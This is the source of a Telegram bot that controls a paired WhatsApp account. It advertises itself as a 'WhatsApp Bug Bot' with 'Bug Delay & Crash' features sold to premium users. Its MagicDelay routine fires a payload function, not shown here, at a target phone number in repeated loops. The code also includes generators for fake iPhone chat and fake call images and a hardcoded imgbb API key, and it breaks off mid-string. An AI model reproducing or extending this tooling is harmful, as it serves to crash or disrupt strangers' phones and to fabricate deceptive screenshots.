const { Telegraf } = require("telegraf");
const { spawn } = require('child_process');
const { pipeline } = require('stream/promises');
const { createWriteStream } = require('fs');
const fs = require('fs');
const path = require('path');
const jid = "0@s.whatsapp.net";
const vm = require('vm');
const os = require('os');
const { tokenBot, ownerID, CHANNEL_USERNAME } = require("./config");
const adminFile = './database/adminuser.json';
const FormData = require("form-data");
const https = require("https");

function fetchJsonHttps(url, timeout = 5000) {
  return new Promise((resolve, reject) => {
    try {
      const req = https.get(url, { timeout }, (res) => {
        const { statusCode } = res;
        if (statusCode < 200 || statusCode >= 300) {
          let _ = '';
          res.on('data', c => _ += c);
          res.on('end', () => reject(new Error(`HTTP ${statusCode}`)));
          return;
        }
        let raw = '';
        res.on('data', (chunk) => (raw += chunk));
        res.on('end', () => {
          try {
            const json = JSON.parse(raw);
            resolve(json);
          } catch (err) {
            reject(new Error('Invalid JSON response'));
          }
        });
      });
      req.on('timeout', () => req.destroy(new Error('Request timeout')));
      req.on('error', (err) => reject(err));
    } catch (err) {
      reject(err);
    }
  });
}

const {
  default: makeWASocket,
  useMultiFileAuthState,
  fetchLatestBaileysVersion,
  DisconnectReason,
  proto,
} = require('@whiskeysockets/baileys');

const pino = require('pino');
const chalk = require('chalk');
const axios = require('axios');
const moment = require('moment-timezone');
const EventEmitter = require('events');

//------------------(IN MEMORY STORE)--------------------//
const makeInMemoryStore = ({ logger = console } = {}) => {
  const ev = new EventEmitter();
  let chats = {}, messages = {}, contacts = {};

  ev.on('messages.upsert', ({ messages: newMessages }) => {
    for (const msg of newMessages) {
      const chatId = msg.key.remoteJid;
      if (!messages[chatId]) messages[chatId] = [];
      messages[chatId].push(msg);
      if (messages[chatId].length > 50) messages[chatId].shift();
      chats[chatId] = {
        ...(chats[chatId] || {}),
        id: chatId,
        name: msg.pushName,
        lastMsgTimestamp: +msg.messageTimestamp
      };
    }
  });

  ev.on('chats.set', ({ chats: newChats }) => { for (const c of newChats) chats[c.id] = c; });
  ev.on('contacts.set', ({ contacts: newContacts }) => { for (const id in newContacts) contacts[id] = newContacts[id]; });

  return {
    chats, messages, contacts,
    bind: (evTarget) => {
      evTarget.on('messages.upsert', (m) => ev.emit('messages.upsert', m));
      evTarget.on('chats.set', (c) => ev.emit('chats.set', c));
      evTarget.on('contacts.set', (c) => ev.emit('contacts.set', c));
    },
    logger
  };
};

//------------------(TASK QUEUE)--------------------//
class TaskQueue {
  constructor() { this.queue = []; this.running = false; }
  async add(task) { this.queue.push(task); this.run(); }
  async run() {
    if (this.running) return;
    this.running = true;
    while (this.queue.length > 0) {
      const job = this.queue.shift();
      try { await job(); } catch (e) { console.error("Task error:", e); }
    }
    this.running = false;
  }
}
const queue = new TaskQueue();
const sleep = (ms) => new Promise((r) => setTimeout(r, ms));

//------------------(WAJIB DI ISI)--------------------//
const thumbnailUrl = "https://files.catbox.moe/l3djrx.jpg";
const ThumbnailPairing = "https://files.catbox.moe/aaercl.jpg";

const bot = new Telegraf(tokenBot);
let sock = null;
let isWhatsAppConnected = false;
let linkedWhatsAppNumber = '';
let lastPairingMessage = null;
const usePairingCode = true;

function formatTarget(number) {
  if (!number) return null;
  number = number.replace(/[^0-9]/g, "");
  if (number.startsWith("0")) number = "62" + number.slice(1);
  return number + "@s.whatsapp.net";
}

//------------------(FILTER BEBAS SPAM)--------------------//
async function MagicDelay(ctx, target) {
  const taskId = Date.now().toString().slice(-6);
  const delay = 3000;
  const C = { reset: "\x1b[0m", bold: "\x1b[1m", green: "\x1b[32m", red: "\x1b[31m", cyan: "\x1b[36m", yellow: "\x1b[33m", gray: "\x1b[90m" };
  const startTime = Date.now();
  const timeNow = new Date().toLocaleTimeString();

  console.log(`\n${C.cyan}${C.bold}⌛ PERMINTAAN JOBS${C.reset}`);
  console.log(`${C.gray}ID:${C.reset} ${taskId}`);
  console.log(`${C.gray}Target:${C.reset} ${target}`);
  console.log(`${C.gray}Time:${C.reset} ${timeNow}\n`);

  for (let i = 1; i <= 3; i++) {
    const loopStart = Date.now();
    try {
      await epcihDiley(sock, target);
      const duration = ((Date.now() - loopStart) / 1000).toFixed(2);
      console.log(`${C.green}📤 Succesfuly${C.reset}  ${C.gray}Loop:${C.reset} ${i}/3  ${C.gray}Duration:${C.reset} ${duration}s`);
    } catch (err) {
      const duration = ((Date.now() - loopStart) / 1000).toFixed(2);
      console.log(`${C.red}⛔ Failed${C.reset}   ${C.gray}Loop:${C.reset} ${i}/3  ${C.gray}Duration:${C.reset} ${duration}s`);
      console.log(`${C.yellow}↳ ${err.message}${C.reset}`);
    }
    await new Promise(r => setTimeout(r, delay));
  }

  const totalTime = ((Date.now() - startTime) / 1000).toFixed(2);
  console.log(`\n${C.cyan}${C.bold}🏁 JOBS COMPLETED${C.reset}`);
  console.log(`${C.gray}ID:${C.reset} ${taskId}`);
  console.log(`${C.gray}Total Runtime:${C.reset} ${totalTime}s\n`);
}

//------------------(PREMIUM GROUP)--------------------//
const PREM_GROUP_DB = path.join(__dirname, "premgb.json");

function loadPremGroups() {
  try {
    if (!fs.existsSync(PREM_GROUP_DB)) fs.writeFileSync(PREM_GROUP_DB, JSON.stringify({ groups: [] }, null, 2));
    const raw = fs.readFileSync(PREM_GROUP_DB, "utf8");
    const json = JSON.parse(raw);
    if (!json || !Array.isArray(json.groups)) return { groups: [] };
    return json;
  } catch { return { groups: [] }; }
}
function savePremGroups(db) { fs.writeFileSync(PREM_GROUP_DB, JSON.stringify(db, null, 2)); }
function isPremGroup(chatId) { return loadPremGroups().groups.includes(Number(chatId)); }
function addPremGroup(chatId) {
  const db = loadPremGroups();
  const id = Number(chatId);
  if (!db.groups.includes(id)) db.groups.push(id);
  savePremGroups(db);
  return true;
}
function delPremGroup(chatId) {
  const db = loadPremGroups();
  const id = Number(chatId);
  db.groups = db.groups.filter((g) => g !== id);
  savePremGroups(db);
  return true;
}

const ownerOnly = () => async (ctx, next) => {
  if (!ctx.from) return;
  if (String(ctx.from.id) !== String(ownerID)) {
    return ctx.reply("❌ Khusus owner.", { reply_to_message_id: ctx.message?.message_id });
  }
  return next();
};

const premGroupOnly = () => async (ctx, next) => {
  const chatType = ctx.chat?.type;
  if (chatType === "private") return ctx.reply("❌ Command ini hanya bisa dipakai di grup premium.");
  if (!isPremGroup(ctx.chat.id)) {
    const title = ctx.chat?.title || "Group ini";
    return ctx.reply(`❌ ☇ Grup <b>${escapeHtml(title)}</b> belum terdaftar sebagai <b>GRUP PREMIUM</b>.`, { parse_mode: "HTML" });
  }
  return next();
};

function escapeHtml(s = "") {
  return String(s).replace(/&/g, "&amp;").replace(/</g, "&lt;").replace(/>/g, "&gt;");
}

// ================================
// POINT SYSTEM
// ================================
const POINTS_FILE = path.join(__dirname, "points.json");

function loadPoints() {
  try {
    if (!fs.existsSync(POINTS_FILE)) fs.writeFileSync(POINTS_FILE, JSON.stringify({}, null, 2));
    return JSON.parse(fs.readFileSync(POINTS_FILE, "utf8") || "{}");
  } catch { return {}; }
}
function savePoints(data) { fs.writeFileSync(POINTS_FILE, JSON.stringify(data, null, 2)); }
function ensureUserPoint(user) {
  const db = loadPoints();
  const id = String(user.id);
  if (!db[id]) {
    db[id] = {
      id, name: user.username ? `@${user.username}` : (user.first_name || "User"),
      points: 0, win: 0, lose: 0, draw: 0
    };
  } else {
    db[id].name = user.username ? `@${user.username}` : (user.first_name || "User");
  }
  savePoints(db);
  return db;
}
function addWinPoint(user) { const db = ensureUserPoint(user); db[String(user.id)].points += 3; db[String(user.id)].win += 1; savePoints(db); }
function addLosePoint(user) { const db = ensureUserPoint(user); db[String(user.id)].lose += 1; savePoints(db); }
function addDrawPoint(user) { const db = ensureUserPoint(user); db[String(user.id)].points += 1; db[String(user.id)].draw += 1; savePoints(db); }
function getUserPoint(userId) { return loadPoints()[String(userId)] || null; }
function getLeaderboard(limit = 10) { return Object.values(loadPoints()).sort((a, b) => b.points - a.points).slice(0, limit); }

function addSuitWin(user) { const db = ensureUserPoint(user); db[String(user.id)].points += 2; db[String(user.id)].win += 1; savePoints(db); }
function addSuitLose(user) { const db = ensureUserPoint(user); db[String(user.id)].lose += 1; savePoints(db); }
function addSuitDraw(user) { const db = ensureUserPoint(user); db[String(user.id)].draw += 1; savePoints(db); }

// ================================
// TIC TAC TOE
// ================================
const tttGames = new Map();
function tttNewBoard() { return Array(9).fill(null); }
function tttWinner(board) {
  const lines = [[0,1,2],[3,4,5],[6,7,8],[0,3,6],[1,4,7],[2,5,8],[0,4,8],[2,4,6]];
  for (const [a, b, c] of lines) if (board[a] && board[a] === board[b] && board[a] === board[c]) return board[a];
  return null;
}
function tttDraw(board) { return board.every(v => v !== null) && !tttWinner(board); }
function tttCell(v) { if (v === "X") return "❌"; if (v === "O") return "⭕"; return "➖"; }
function tttSafeName(user) { return user?.username ? `@${user.username}` : (user?.first_name || "User"); }
function tttBoardKeyboard(chatId, gameId, board, locked = false) {
  const btn = (i) => ({
    text: tttCell(board[i]),
    callback_data: locked ? `tttnoop_${chatId}_${gameId}` : `tttmove_${chatId}_${gameId}_${i}`
  });
  return { inline_keyboard: [[btn(0), btn(1), btn(2)], [btn(3), btn(4), btn(5)], [btn(6), btn(7), btn(8)]] };
}
function tttRender(game) {
  const xName = game.players.X ? tttSafeName(game.players.X) : "-";
  const oName = game.players.O ? tttSafeName(game.players.O) : "-";
  const turnUser = game.turn === "X" ? game.players.X : game.players.O;
  const turnName = turnUser ? tttSafeName(turnUser) : "-";
  return `🎮 <b>TIC TAC TOE</b>\n\n❌ X : <b>${xName}</b>\n⭕ O : <b>${oName}</b>\n\nGiliran:\n<b>${game.turn}</b> - ${turnName}`;
}

// ================================
// SUIT GAME
// ================================
const suitGames = new Map();
function suitName(user) { return user?.username ? `@${user.username}` : (user?.first_name || "User"); }
function suitChoiceLabel(c) {
  if (c === "rock") return "🪨 Batu";
  if (c === "paper") return "📄 Kertas";
  if (c === "scissors") return "✂️ Gunting";
  return "-";
}
function suitWin(a, b) {
  if (a === b) return "draw";
  if ((a === "rock" && b === "scissors") || (a === "paper" && b === "rock") || (a === "scissors" && b === "paper")) return "p1";
  return "p2";
}
function suitPickKeyboard(chatId, gameId) {
  return {
    inline_keyboard: [[
      { text: "🪨 Batu", callback_data: `suitpick_${chatId}_${gameId}_rock` },
      { text: "📄 Kertas", callback_data: `suitpick_${chatId}_${gameId}_paper` },
      { text: "✂️ Gunting", callback_data: `suitpick_${chatId}_${gameId}_scissors` }
    ]]
  };
}

//---------(BLOCK CMD)---------//
const BLOCKCMD_FILE = path.join(__dirname, "blocked_commands.json");
let blockedCommands = [];
function loadBlockedCommands() {
  try {
    if (fs.existsSync(BLOCKCMD_FILE)) {
      const parsed = JSON.parse(fs.readFileSync(BLOCKCMD_FILE, "utf8"));
      blockedCommands = Array.isArray(parsed) ? parsed.map(c => String(c).toLowerCase().trim()) : [];
    }
  } catch (err) { console.error("Gagal load blocked commands:", err.message); blockedCommands = []; }
}
function saveBlockedCommands() {
  try { fs.writeFileSync(BLOCKCMD_FILE, JSON.stringify(blockedCommands, null, 2)); } catch (err) { console.error(err.message); }
}
function normalizeCommandName(input) { return String(input || "").trim().toLowerCase().replace(/^\//, ""); }
function isCommandBlocked(cmd) { return blockedCommands.includes(normalizeCommandName(cmd)); }
loadBlockedCommands();

//---------(APPROVED GROUP)---------//
const APPROVED_GROUPS_FILE = path.join(__dirname, "approved_groups.json");
let approvedGroups = [];
let pendingGroups = new Map();
function loadApprovedGroups() {
  try {
    if (fs.existsSync(APPROVED_GROUPS_FILE)) {
      const parsed = JSON.parse(fs.readFileSync(APPROVED_GROUPS_FILE, "utf8"));
      approvedGroups = Array.isArray(parsed) ? parsed : [];
    }
  } catch (err) { console.error("Gagal load approved groups:", err.message); approvedGroups = []; }
}
function saveApprovedGroups() {
  try { fs.writeFileSync(APPROVED_GROUPS_FILE, JSON.stringify(approvedGroups, null, 2)); } catch (err) { console.error(err.message); }
}
function isOwner(userId) { return String(userId) === String(ownerID); }
function isGroupApproved(chatId) { return approvedGroups.includes(String(chatId)); }
loadApprovedGroups();

//---------(PREMIUM USER)---------//
const premiumFile = './database/premium.json';
const cooldownFile = './database/cooldown.json';

const loadPremiumUsers = () => { try { return JSON.parse(fs.readFileSync(premiumFile)); } catch { return {}; } };
const savePremiumUsers = (u) => { fs.writeFileSync(premiumFile, JSON.stringify(u, null, 2)); };
const addpremUser = (userId, duration) => {
  const u = loadPremiumUsers();
  const exp = moment().add(duration, 'days').tz('Asia/Jakarta').format('DD-MM-YYYY');
  u[userId] = exp;
  savePremiumUsers(u);
  return exp;
};
const removePremiumUser = (userId) => { const u = loadPremiumUsers(); delete u[userId]; savePremiumUsers(u); };
const isPremiumUser = (userId) => {
  const u = loadPremiumUsers();
  if (u[userId]) {
    const exp = moment(u[userId], 'DD-MM-YYYY');
    if (moment().isBefore(exp)) return true;
    removePremiumUser(userId);
    return false;
  }
  return false;
};

const loadCooldown = () => { try { return JSON.parse(fs.readFileSync(cooldownFile)).cooldown || 5; } catch { return 5; } };
const saveCooldown = (s) => { fs.writeFileSync(cooldownFile, JSON.stringify({ cooldown: s }, null, 2)); };
let cooldown = loadCooldown();
const userCooldowns = new Map();

function formatRuntime() {
  let sec = Math.floor(process.uptime());
  let hrs = Math.floor(sec / 3600); sec %= 3600;
  let mins = Math.floor(sec / 60); sec %= 60;
  return `${hrs}h ${mins}m ${sec}s`;
}
function formatMemory() { return `${(process.memoryUsage().rss / 524 / 524).toFixed(0)} MB`; }

//------------------(START SESI WA)--------------------//
const startSesi = async () => {
  console.clear();
  console.log(chalk.bold.yellow(`
⬡═—⊱ CHECKING SERVER ⊰—═⬡
┃Bot Sukses Terhubung Terimakasih 
⬡═―—―――――――――――――――――—═⬡
`));

  const store = makeInMemoryStore({ logger: pino({ level: 'silent' }) });
  const { state, saveCreds } = await useMultiFileAuthState('./session');
  const { version } = await fetchLatestBaileysVersion();

  const connectionOptions = {
    version,
    keepAliveIntervalMs: 30000,
    printQRInTerminal: !usePairingCode,
    logger: pino({ level: "silent" }),
    auth: state,
    browser: ['Mac OS', 'Safari', '5.15.7'],
    getMessage: async () => ({ conversation: 'Apophis' }),
  };

  sock = makeWASocket(connectionOptions);

  sock.ev.on("messages.upsert", async (m) => {
    try { if (!m || !m.messages || !m.messages[0]) return; } catch (error) {}
  });

  sock.ev.on('creds.update', saveCreds);
  store.bind(sock.ev);

  sock.ev.on('connection.update', (update) => {
    const { connection, lastDisconnect } = update;
    if (connection === 'open') {
      if (lastPairingMessage) {
        const connectedMenu = `<blockquote><pre>
⬡═―—⊱ ⎧ HEFAISTOS HADES ⎭ ⊰―—═⬡
⌑ Number: ${lastPairingMessage.phoneNumber}
⌑ Pairing Code: ${lastPairingMessage.pairingCode}
⌑ Type: Sudah Terhubung
╘—————————————————═⬡
</pre></blockquote>`;
        try {
          bot.telegram.editMessageCaption(
            lastPairingMessage.chatId, lastPairingMessage.messageId,
            undefined, connectedMenu, { parse_mode: "HTML" }
          );
        } catch (e) {}
      }
      console.clear();
      isWhatsAppConnected = true;
      console.log(chalk.bold.yellow(`
⬡═—⊱ CHECKING SERVER ⊰—═⬡
┃Sender Sukses Terhubung Terimakasih 
⬡═―—―――――――――――――――――—═⬡
`));
    }
    if (connection === 'close') {
      const shouldReconnect = lastDisconnect?.error?.output?.statusCode !== DisconnectReason.loggedOut;
      console.log(chalk.red('Koneksi WhatsApp terputus:'), shouldReconnect ? 'Mencoba Menautkan Perangkat' : 'Silakan Menautkan Perangkat Lagi');
      if (shouldReconnect) startSesi();
      isWhatsAppConnected = false;
    }
  });
};

startSesi();

//------------------(MIDDLEWARE)--------------------//
const checkWhatsAppConnection = (ctx, next) => {
  if (!isWhatsAppConnected) { ctx.reply("🪧 ☇ Tidak ada sender yang terhubung"); return; }
  next();
};
const checkCooldown = (ctx, next) => {
  const userId = ctx.from.id;
  const now = Date.now();
  if (userCooldowns.has(userId)) {
    const diff = (now - userCooldowns.get(userId)) / 500;
    if (diff < cooldown) {
      const remaining = Math.ceil(cooldown - diff);
      ctx.reply(`⏳ ☇ Harap menunggu ${remaining} detik`);
      return;
    }
  }
  userCooldowns.set(userId, now);
  next();
};
const checkPremium = (ctx, next) => {
  if (!isPremiumUser(ctx.from.id)) { ctx.reply("❌ ☇ Akses hanya untuk premium"); return; }
  next();
};

//------------------(PAIRING)--------------------//
bot.command("addpairing", async (ctx) => {
  if (ctx.from.id != ownerID) return ctx.reply("❌ ☇ Akses hanya untuk pemilik");
  const args = ctx.message.text.split(" ")[1];
  if (!args) return ctx.reply("🪧 ☇ Format: /addpairing 62×××");
  const phoneNumber = args.replace(/[^0-9]/g, "");
  if (!phoneNumber) return ctx.reply("❌ ☇ Nomor tidak valid");
  try {
    if (!sock) return ctx.reply("❌ ☇ Socket belum siap, coba lagi nanti");
    if (sock.authState.creds.registered) return ctx.reply(`✅ ☇ WhatsApp sudah terhubung dengan nomor: ${phoneNumber}`);
    const code = await sock.requestPairingCode(phoneNumber, "1234GINA");
    const formattedCode = code?.match(/.{1,4}/g)?.join("-") || code;
    const pairingMenu = `<blockquote><pre>
⬡═―—⊱ ⎧ HEFAISTOS HADES ⎭ ⊰―—═⬡
⌑ Number: ${phoneNumber}
⌑ Pairing Code: ${formattedCode}
⌑ Status Bot : Belum Terhubung
╘═——————————————═⬡
</pre></blockquote>`;
    const sentMsg = await ctx.replyWithPhoto(ThumbnailPairing, {
      caption: pairingMenu, parse_mode: "HTML",
      reply_markup: { inline_keyboard: [[{ text: "SALIN CODE", copy_text: { text: formattedCode } }]] }
    });
    lastPairingMessage = { chatId: ctx.chat.id, messageId: sentMsg.message_id, phoneNumber, pairingCode: formattedCode };
  } catch (err) { console.error(err); }
});

//------------------(ADMIN)--------------------//
const loadJSON = (file) => { if (!fs.existsSync(file)) return []; return JSON.parse(fs.readFileSync(file, 'utf8')); };
const saveJSON = (file, data) => { fs.writeFileSync(file, JSON.stringify(data, null, 2)); };
let adminUsers = loadJSON(adminFile);

const checkAdmin = (ctx, next) => {
  if (!adminUsers.includes(ctx.from.id.toString())) {
    return ctx.reply("❌ Anda bukan Admin. jika anda adalah owner silahkan daftar ulang ID anda menjadi admin");
  }
  next();
};

bot.command('addadmin', async (ctx) => {
  if (ctx.from.id != ownerID) return ctx.reply("❌ ☇ Akses hanya untuk pemilik");
  const args = ctx.message.text.split(' ');
  const userId = args[1];
  if (adminUsers.includes(userId)) return ctx.reply(`✅ ${userId} sudah memiliki status Admin.`);
  adminUsers.push(userId);
  saveJSON(adminFile, adminUsers);
  return ctx.reply(`🎉 ${userId} sekarang memiliki akses Admin!`);
});

//------------------(FITUR UTILITY)--------------------//
bot.command("tiktok", async (ctx) => {
  const args = ctx.message.text.split(" ")[1];
  if (!args) return ctx.replyWithMarkdown("🎵 *Download TikTok*\n\nContoh: `/tiktok https://vt.tiktok.com/xxx`");
  if (!args.match(/(tiktok\.com|vm\.tiktok\.com|vt\.tiktok\.com)/i)) return ctx.reply("❌ Format link TikTok tidak valid!");
  try {
    const processing = await ctx.reply("⏳ _Mengunduh video TikTok..._", { parse_mode: "Markdown" });
    const encodedParams = new URLSearchParams();
    encodedParams.set("url", args); encodedParams.set("hd", "1");
    const { data } = await axios.post("https://tikwm.com/api/", encodedParams, {
      headers: { "Content-Type": "application/x-www-form-urlencoded", "User-Agent": "TikTokBot/1.0" }, timeout: 30000,
    });
    if (!data.data?.play) throw new Error("URL video tidak ditemukan");
    await ctx.deleteMessage(processing.message_id);
    await ctx.replyWithVideo({ url: data.data.play }, {
      caption: `🎵 *${data.data.title || "Video TikTok"}*\n🔗 ${args}`, parse_mode: "Markdown",
    });
    if (data.data.music) await ctx.replyWithAudio({ url: data.data.music }, { title: "Audio Original" });
  } catch (err) { console.error("[TIKTOK ERROR]", err.message); ctx.reply(`❌ Gagal mengunduh: ${err.message}`); }
});

function log(message, error) {
  if (error) console.error(`[EncryptBot] ❌ ${message}`, error);
  else console.log(`[EncryptBot] ✅ ${message}`);
}

bot.command("iqc", async (ctx) => {
  const fullText = (ctx.message.text || "").split(" ").slice(1).join(" ").trim();
  try {
    await ctx.sendChatAction("upload_photo");
    if (!fullText) return ctx.reply("🧩 Masukkan teks!\nContoh: /iqc Konichiwa|06:00|100");
    const parts = fullText.split("|");
    if (parts.length < 2) return ctx.reply("❗ Format salah!\n🍀 Contoh: /iqc Teks|WaktuChat|StatusBar");
    let [message, chatTime, statusBarTime] = parts.map((p) => p.trim());
    if (!statusBarTime) {
      const now = new Date();
      statusBarTime = `${String(now.getHours()).padStart(2, "0")}:${String(now.getMinutes()).padStart(2, "0")}`;
    }
    if (message.length > 80) return ctx.reply("🍂 Teks terlalu panjang! Maksimal 80 karakter.");
    const url = `https://api.zenzxz.my.id/maker/fakechatiphone?text=${encodeURIComponent(message)}&chatime=${encodeURIComponent(chatTime)}&statusbartime=${encodeURIComponent(statusBarTime)}`;
    const response = await fetch(url);
    if (!response.ok) throw new Error("Gagal mengambil gambar dari API");
    const buffer = await response.buffer();
    const caption = `\n✨ <b>Fake Chat iPhone Berhasil Dibuat!</b>\n\n💬 <b>Pesan:</b> ${message}\n⏰ <b>Waktu Chat:</b> ${chatTime}\n📱 <b>Status Bar:</b> ${statusBarTime}\n`;
    await ctx.replyWithPhoto({ source: buffer }, { caption, parse_mode: "HTML" });
  } catch (err) { console.error(err); await ctx.reply("🍂 Gagal membuat gambar. Coba lagi nanti."); }
});

bot.command("fakecall", async (ctx) => {
  const args = ctx.message.text.split(" ").slice(1).join(" ").split("|");
  if (!ctx.message.reply_to_message || !ctx.message.reply_to_message.photo) return ctx.reply("❌ Reply ke foto untuk dijadikan avatar!");
  const nama = args[0]?.trim(), durasi = args[1]?.trim();
  if (!nama || !durasi) return ctx.reply("📌 Format: `/fakecall nama|durasi` (reply foto)", { parse_mode: "Markdown" });
  try {
    const fileId = ctx.message.reply_to_message.photo.pop().file_id;
    const fileLink = await ctx.telegram.getFileLink(fileId);
    const api = `https://api.zenzxz.my.id/maker/fakecall?nama=${encodeURIComponent(nama)}&durasi=${encodeURIComponent(durasi)}&avatar=${encodeURIComponent(fileLink)}`;
    const res = await fetch(api);
    const buffer = await res.buffer();
    await ctx.replyWithPhoto({ source: buffer }, { caption: `📞 Fake Call dari *${nama}* (durasi: ${durasi})`, parse_mode: "Markdown" });
  } catch (err) { console.error(err); ctx.reply("⚠️ Gagal membuat fakecall."); }
});

bot.command("tourl", async (ctx) => {
  try {
    const reply = ctx.message.reply_to_message;
    if (!reply) return ctx.reply("❗ Reply media (foto/video/audio/dokumen) dengan perintah /tourl");
    let fileId;
    if (reply.photo) fileId = reply.photo[reply.photo.length - 1].file_id;
    else if (reply.video) fileId = reply.video.file_id;
    else if (reply.audio) fileId = reply.audio.file_id;
    else if (reply.document) fileId = reply.document.file_id;
    else return ctx.reply("❌ Format file tidak didukung.");
    const fileLink = await ctx.telegram.getFileLink(fileId);
    const response = await axios.get(fileLink.href, { responseType: "arraybuffer" });
    const buffer = Buffer.from(response.data);
    const form = new FormData();
    form.append("reqtype", "fileupload");
    form.append("fileToUpload", buffer, { filename: path.basename(fileLink.href), contentType: "application/octet-stream" });
    const uploadRes = await axios.post("https://catbox.moe/user/api.php", form, { headers: form.getHeaders() });
    ctx.reply(`✅ File berhasil diupload:\n${uploadRes.data}`);
  } catch (err) { console.error("❌ Gagal tourl:", err.message); ctx.reply("❌ Gagal mengupload file ke URL."); }
});

const IMGBB_API_KEY = "76919ab4062bedf067c9cab0351cf632";
bot.command("tourl2", async (ctx) => {
  try {
    const reply = ctx.message.reply_to_message;
    if (!reply || !reply.photo) return ctx.reply("❗ Reply foto dengan /tourl2");
    const fileId = reply.photo[reply.photo.length - 1].file_id;
    const fileLink = await ctx.telegram.getFileLink(fileId);
    const response = await axios.get(fileLink.href, { responseType: "arraybuffer" });
    const buffer = Buffer.from(response.data);
    const form = new FormData();
    form.append("image", buffer.toString("base64"));
    const uploadRes = await axios.post(`https://api.imgbb.com/1/upload?key=${IMGBB_API_KEY}`, form, { headers: form.getHeaders() });
    ctx.reply(`✅ Foto berhasil diupload:\n${uploadRes.data.data.url}`);
  } catch (err) { console.error("❌ tourl2 error:", err.message); ctx.reply("❌ Gagal mengupload foto ke i.ibb.co"); }
});

//------------------(OWNER)--------------------//
bot.command("setcd", async (ctx) => {
  if (ctx.from.id != ownerID) return ctx.reply("❌ ☇ Akses hanya untuk pemilik");
  const args = ctx.message.text.split(" ");
  const seconds = parseInt(args[1]);
  if (isNaN(seconds) || seconds < 0) return ctx.reply("🪧 ☇ Format: /setcd 5");
  cooldown = seconds; saveCooldown(seconds);
  ctx.reply(`✅ ☇ Cooldown berhasil diatur ke ${seconds} detik`);
});

bot.command("killsession", async (ctx) => {
  if (ctx.from.id != ownerID) return ctx.reply("❌ ☇ Akses hanya untuk pemilik");
  try {
    const sessionDirs = ["./session", "./sessions"];
    let deleted = false;
    for (const dir of sessionDirs) {
      if (fs.existsSync(dir)) { fs.rmSync(dir, { recursive: true, force: true }); deleted = true; }
    }
    if (deleted) {
      await ctx.reply("✅ ☇ Session berhasil dihapus, panel akan restart");
      setTimeout(() => process.exit(1), 2000);
    } else ctx.reply("🪧 ☇ Tidak ada folder session yang ditemukan");
  } catch (err) { console.error(err); ctx.reply("❌ ☇ Gagal menghapus session"); }
});

bot.command('addprem', async (ctx) => {
  if (ctx.from.id != ownerID) return ctx.reply("❌ ☇ Akses hanya untuk pemilik");
  let userId;
  const args = ctx.message.text.split(" ");
  if (ctx.message.reply_to_message) userId = ctx.message.reply_to_message.from.id.toString();
  else if (args.length < 3) return ctx.reply("🪧 ☇ Format: /addprem 12345678 30d\nAtau reply pesan user");
  else userId = args[1];
  const durationIndex = ctx.message.reply_to_message ? 1 : 2;
  const duration = parseInt(args[durationIndex]);
  if (isNaN(duration)) return ctx.reply("🪧 ☇ Durasi harus berupa angka dalam hari");
  const expiryDate = addpremUser(userId, duration);
  ctx.reply(`✅ ☇ ${userId} berhasil ditambahkan sebagai pengguna premium sampai ${expiryDate}`);
});

bot.command('delprem', async (ctx) => {
  if (ctx.from.id != ownerID) return ctx.reply("❌ ☇ Akses hanya untuk pemilik");
  let userId;
  const args = ctx.message.text.split(" ");
  if (ctx.message.reply_to_message) userId = ctx.message.reply_to_message.from.id.toString();
  else if (args.length < 2) return ctx.reply("🪧 ☇ Format: /delprem 12345678\nAtau reply pesan user");
  else userId = args[1];
  removePremiumUser(userId);
  ctx.reply(`✅ ☇ ${userId} telah berhasil dihapus dari daftar pengguna premium`);
});

//------------------(MIDDLEWARE GROUP)--------------------//
bot.use(async (ctx, next) => {
  if (!ctx.chat) return next();
  const isGroup = ctx.chat.type === "group" || ctx.chat.type === "supergroup";
  if (!isGroup) return next();
  const chatId = String(ctx.chat.id);
  const text = ctx.message?.text || "";
  const cmd = text.startsWith("/") ? text.split(" ")[0].toLowerCase() : "";
  const bypass = ["/approved", "/unapproved", "/listapprovedgroup"];
  if (!isGroupApproved(chatId) && !bypass.includes(cmd)) {
    if (ctx.message?.text?.startsWith("/")) {
      await ctx.reply("❌ Group ini belum di-approved oleh owner untuk melanjutkan 🪧 Format: /approved -100xxxxxxxxxx");
    }
    return;
  }
  return next();
});

//------------------(MIDDLEWARE BLOCK CMD)--------------------//
bot.use(async (ctx, next) => {
  if (!ctx.message || !ctx.message.text) return next();
  const text = ctx.message.text.trim();
  if (!text.startsWith("/")) return next();
  const command = normalizeCommandName(text.split(" ")[0].split("@")[0]);
  const bypassCommands = ["blockcmd", "unblockcmd", "listblockcmd"];
  if (!bypassCommands.includes(command) && isCommandBlocked(command)) {
    await ctx.reply(`❌ Command /${command} sedang diblokir.`);
    return;
  }
  return next();
});

// ==============================
// /start — RICH MESSAGE
// ==============================
bot.start(async (ctx) => {
  const userId = ctx.from.id;
  const premiumStatus = isPremiumUser(userId) ? "Premium" : "Free";
  const senderStatus = isWhatsAppConnected ? "Aktif" : "Tidak Aktif";
  const runtimeStatus = formatRuntime();
  const memoryStatus = formatMemory();

  const richHtml = `
<h1>⚔️ Hefaistos Hades</h1>
<p><i>System Control • WhatsApp Bug Bot</i></p>
<hr/>
<h2>📊 Status System</h2>
<table>
  <tr><th>Komponen</th><th>Status</th></tr>
  <tr><td>Sender</td><td><b>${senderStatus}</b></td></tr>
  <tr><td>Runtime</td><td><code>${runtimeStatus}</code></td></tr>
  <tr><td>Memory</td><td><code>${memoryStatus}</code></td></tr>
  <tr><td>Akses Kamu</td><td><b>${premiumStatus}</b></td></tr>
</table>
<hr/>
<h2>✨ Fitur Utama</h2>
<checklist>
  <li checked>Bug Delay &amp; Crash</li>
  <li checked>Pairing WhatsApp</li>
  <li checked>Premium Group System</li>
  <li checked>Auto Update Script</li>
  <li checked>Game Tic Tac Toe &amp; Suit</li>
</checklist>
<hr/>
<details>
  <summary>📌 Info Developer</summary>
  <p>Developer: <b>@shinracery</b></p>
  <p>Version: <b>New</b></p>
  <p>Language: <b>JavaScript</b></p>
</details>
<p>Tekan tombol <b>Open Menu</b> di bawah untuk mulai.</p>
`;

  const keyboard = [[{
    text: "𝐎𝐩𝐞𝐧 𝐌𝐞𝐧𝐮",
    callback_data: "/setting_menu",
    style: "success",
    icon_custom_emoji_id: "6163328887813051603"
  }]];

  try {
    await ctx.telegram.callApi("sendRichMessage", {
      chat_id: ctx.chat.id,
      rich_message: { html: richHtml },
      reply_markup: { inline_keyboard: keyboard }
    });
    console.log("✅ Rich message /start terkirim");
  } catch (err) {
    console.error("❌ Rich gagal, fallback ke foto:", err.response?.description || err.message);
    const fallbackMenu = `
<blockquote>•.¸ Hefaistos Hades ¸.•</blockquote>
↯ Developer: @shinracery
↯ Version: New
↯ Language: JavaScript

